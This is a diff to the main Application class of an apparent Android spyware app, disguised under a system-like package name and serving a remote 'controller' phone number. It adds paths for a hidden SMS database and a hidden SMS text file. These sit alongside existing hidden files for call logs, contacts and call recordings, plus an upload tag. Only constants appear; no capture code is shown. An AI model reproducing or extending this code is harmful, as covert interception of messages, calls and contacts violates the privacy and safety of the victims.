@@ -5,12 +5,15 @@ import java.io.File;
 import android.app.Application;
 import android.os.Environment;
 
+import com.android.system.controled.db.DatabaseUtil;
 import com.android.system.controled.util.InitUtil;
 import com.android.system.controled.util.StringUtil;
 
 public class MainApplication extends Application {
 
 	private static final String TAG = "MainApplication";
+	
+//	public static final boolean debug = true;
 
 	private String controllerTel = "";// 控制者的电话号码
 	/**
@@ -56,11 +59,14 @@ public class MainApplication extends Application {
 	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";
 
 	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
-
+	public static final String FILE_SMS_DB = MainApplication.FILE_IN_SDCARD + DatabaseUtil.DB_NAME;
+	
+	public static final String FILE_SMS_TEXT = FILE_IN_SDCARD + ".androidsms.txt";
 	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
 	public static final File FILE_CONTACTS = new File(FILE_IN_SDCARD + ".contacts.txt");
 	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
 	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
+	
 	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
 	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
 
